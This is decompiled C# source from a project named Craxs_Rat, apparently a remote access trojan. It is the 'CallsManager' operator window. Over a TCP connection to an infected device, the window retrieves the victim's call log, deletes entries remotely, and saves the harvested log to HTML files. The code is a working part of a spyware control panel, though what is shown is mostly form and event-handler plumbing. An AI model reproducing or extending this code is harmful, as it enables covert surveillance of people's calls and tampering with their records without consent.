using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000A8 RID: 168
	[DesignerGenerated]
	public partial class CallsManager : Form
	{
		// Token: 0x06000A5D RID: 2653 RVA: 0x00071D70 File Offset: 0x0006FF70
		public CallsManager()
		{
			base.Load += this.CallsManager_Load;
			base.Activated += this.CallsManager_Activated;
			base.Deactivate += this.CallsManager_Deactivate;
			this.string_0 = "null";
			this.bool_0 = false;
			this.InitializeComponent();
		}

		// Token: 0x170002E9 RID: 745
		// (get) Token: 0x06000A60 RID: 2656 RVA: 0x00006065 File Offset: 0x00004265
		// (set) Token: 0x06000A61 RID: 2657 RVA: 0x000725BC File Offset: 0x000707BC
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewRowsRemovedEventHandler value2 = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
				DataGridViewRowsAddedEventHandler value3 = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
				EventHandler value4 = new EventHandler(this.DGV0_SelectionChanged);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved -= value2;
					dgv.RowsAdded -= value3;
					dgv.SelectionChanged -= value4;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved += value2;
					dgv.RowsAdded += value3;
					dgv.SelectionChanged += value4;
				}
			}
		}

		// Token: 0x170002EA RID: 746
		// (get) Token: 0x06000A62 RID: 2658 RVA: 0x0000606D File Offset: 0x0000426D
		// (set) Token: 0x06000A63 RID: 2659 RVA: 0x00072638 File Offset: 0x00070838
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x170002EB RID: 747
		// (get) Token: 0x06000A64 RID: 2660 RVA: 0x00006075 File Offset: 0x00004275
		// (set) Token: 0x06000A65 RID: 2661 RVA: 0x0007264C File Offset: 0x0007084C
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002EC RID: 748
		// (get) Token: 0x06000A66 RID: 2662 RVA: 0x0000607D File Offset: 0x0000427D
		// (set) Token: 0x06000A67 RID: 2663 RVA: 0x00072690 File Offset: 0x00070890
		internal virtual ToolStripMenuItem DeleteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteToolStripMenuItem_Click);
				ToolStripMenuItem deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click -= value2;
				}
				this._DeleteToolStripMenuItem = value;
				deleteToolStripMenuItem = this._DeleteToolStripMenuItem;
				if (deleteToolStripMenuItem != null)
				{
					deleteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002ED RID: 749
		// (get) Token: 0x06000A68 RID: 2664 RVA: 0x00006085 File Offset: 0x00004285
		// (set) Token: 0x06000A69 RID: 2665 RVA: 0x000726D4 File Offset: 0x000708D4
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002EE RID: 750
		// (get) Token: 0x06000A6A RID: 2666 RVA: 0x0000608D File Offset: 0x0000428D
		// (set) Token: 0x06000A6B RID: 2667 RVA: 0x00072718 File Offset: 0x00070918
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170002F7 RID: 759
		// (get) Token: 0x06000A6C RID: 2668 RVA: 0x00006095 File Offset: 0x00004295
		// (set) Token: 0x06000A6D RID: 2669 RVA: 0x0007275C File Offset: 0x0007095C
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x170002EF RID: 751
		// (get) Token: 0x06000A6E RID: 2670 RVA: 0x0000609D File Offset: 0x0000429D
		// (set) Token: 0x06000A6F RID: 2671 RVA: 0x000727A0 File Offset: 0x000709A0
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x170002F0 RID: 752
		// (get) Token: 0x06000A70 RID: 2672 RVA: 0x000060A5 File Offset: 0x000042A5
		// (set) Token: 0x06000A71 RID: 2673 RVA: 0x000727B4 File Offset: 0x000709B4
		internal virtual PictureBox BoxTitle
		{
			[CompilerGenerated]
			get
			{
				return this._BoxTitle;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.BoxTitle_Paint);
				EventHandler value3 = new EventHandler(this.BoxTitle_Resize);
				PictureBox boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint -= value2;
					boxTitle.Resize -= value3;
				}
				this._BoxTitle = value;
				boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint += value2;
					boxTitle.Resize += value3;
				}
			}
		}

		// Token: 0x170002F1 RID: 753
		// (get) Token: 0x06000A72 RID: 2674 RVA: 0x000060AD File Offset: 0x000042AD
		// (set) Token: 0x06000A73 RID: 2675 RVA: 0x00072814 File Offset: 0x00070A14
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x170002F2 RID: 754
		// (get) Token: 0x06000A74 RID: 2676 RVA: 0x000060B5 File Offset: 0x000042B5
		// (set) Token: 0x06000A75 RID: 2677 RVA: 0x00072828 File Offset: 0x00070A28
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x170002F3 RID: 755
		// (get) Token: 0x06000A76 RID: 2678 RVA: 0x000060BD File Offset: 0x000042BD
		// (set) Token: 0x06000A77 RID: 2679 RVA: 0x0007283C File Offset: 0x00070A3C
		internal virtual DataGridViewTextBoxColumn Column9 { get; set; }

		// Token: 0x170002F4 RID: 756
		// (get) Token: 0x06000A78 RID: 2680 RVA: 0x000060C5 File Offset: 0x000042C5
		// (set) Token: 0x06000A79 RID: 2681 RVA: 0x00072850 File Offset: 0x00070A50
		internal virtual DataGridViewTextBoxColumn Column7 { get; set; }

		// Token: 0x170002F5 RID: 757
		// (get) Token: 0x06000A7A RID: 2682 RVA: 0x000060CD File Offset: 0x000042CD
		// (set) Token: 0x06000A7B RID: 2683 RVA: 0x00072864 File Offset: 0x00070A64
		internal virtual DataGridViewTextBoxColumn Column2 { get; set; }

		// Token: 0x170002F6 RID: 758
		// (get) Token: 0x06000A7C RID: 2684 RVA: 0x000060D5 File Offset: 0x000042D5
		// (set) Token: 0x06000A7D RID: 2685 RVA: 0x00072878 File Offset: 0x00070A78
		internal virtual DataGridViewImageColumn Column3 { get; set; }

		// Token: 0x06000A7E RID: 2686 RVA: 0x0007288C File Offset: 0x00070A8C
		private void method_0()
		{
			this.BoxTitle.BackColor = Module5.color_0;
			try
			{
				foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
				{
					dataGridView.BackgroundColor = Module5.color_0;
					dataGridView.BackColor = Module5.color_0;
					dataGridView.ColumnHeadersDefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.BackColor = Module5.color_0;
					dataGridView.DefaultCellStyle.SelectionForeColor = Module5.color_0;
					dataGridView.DefaultCellStyle.ForeColor = Module5.White;
					dataGridView.DefaultCellStyle.SelectionBackColor = Module5.White;
					dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = Module5.White;
				}
			}
			finally
			{
				IEnumerator<DataGridView> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x06000A7F RID: 2687 RVA: 0x0007296C File Offset: 0x00070B6C
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x06000A80 RID: 2688 RVA: 0x000729B4 File Offset: 0x00070BB4
		private void CallsManager_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\5.ico");
			this.method_0();
			this.ctxMenu.Renderer = new GClass12();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			if (Operators.CompareString(Module5.Saving_data, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
			this.bool_0 = true;
		}

		// Token: 0x06000A81 RID: 2689 RVA: 0x00072A78 File Offset: 0x00070C78
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.tcpClient_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".calls",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_40,
									GClass9.string_0,
									"del",
									GClass9.string_1,
									text
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
							this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
						}
					}
				}
			}
		}

		// Token: 0x06000A82 RID: 2690 RVA: 0x00072BD0 File Offset: 0x00070DD0
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".calls",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_1,
						GClass9.string_0,
						"calls"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x06000A83 RID: 2691 RVA: 0x00072C84 File Offset: 0x00070E84
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem((CallsManager.Class14.waitCallback_0 == null) ? (CallsManager.Class14.waitCallback_0 = new WaitCallback(CallsManager.Class14.class14_0.method_0)) : CallsManager.Class14.waitCallback_0, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_1 + " - " + this.string_2,
					"Call Log",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x06000A84 RID: 2692 RVA: 0x00072D5C File Offset: 0x00070F5C
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Module8.smethod_5(this.gclass8_0);
			ThreadPool.QueueUserWorkItem((CallsManager.Class14.waitCallback_1 != null) ? CallsManager.Class14.waitCallback_1 : (CallsManager.Class14.waitCallback_1 = new WaitCallback(CallsManager.Class14.class14_0.method_1)), new object[]
			{
				this.DGV0,
				this.object_0,
				"Calls Manager",
				this.object_1,
				this.string_1 + " - " + this.string_2,
				"Call Log",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x06000A85 RID: 2693 RVA: 0x00072E10 File Offset: 0x00071010
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.bool_0)
				{
					int count = this.DGV0.Rows.Count;
					string str = "All " + Conversions.ToString(count);
					string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color white = Module5.White;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)white.R, (int)white.G, (int)white.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(Module5.White);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, Module8.font_1);
					Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
					e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), Module8.font_1, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", Module8.font_1);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x06000A86 RID: 2694 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void CallsManager_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000A87 RID: 2695 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void CallsManager_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000A88 RID: 2696 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000A89 RID: 2697 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000A8A RID: 2698 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x06000A8B RID: 2699 RVA: 0x00072FC4 File Offset: 0x000711C4
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x040005E1 RID: 1505
		public TcpClient tcpClient_0;

		// Token: 0x040005E2 RID: 1506
		public GClass8 gclass8_0;

		// Token: 0x040005E3 RID: 1507
		public string string_0;

		// Token: 0x040005E4 RID: 1508
		public string object_0;

		// Token: 0x040005E5 RID: 1509
		public string object_1;

		// Token: 0x040005E6 RID: 1510
		public string string_1;

		// Token: 0x040005E7 RID: 1511
		public string string_2;

		// Token: 0x040005E8 RID: 1512
		private bool bool_0;

		// Token: 0x020000A9 RID: 169
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class14
		{
			// Token: 0x06000A8E RID: 2702 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x06000A8F RID: 2703 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x040005E9 RID: 1513
			public static readonly CallsManager.Class14 class14_0 = new CallsManager.Class14();

			// Token: 0x040005EA RID: 1514
			public static WaitCallback waitCallback_0;

			// Token: 0x040005EB RID: 1515
			public static WaitCallback waitCallback_1;
		}
	}
}
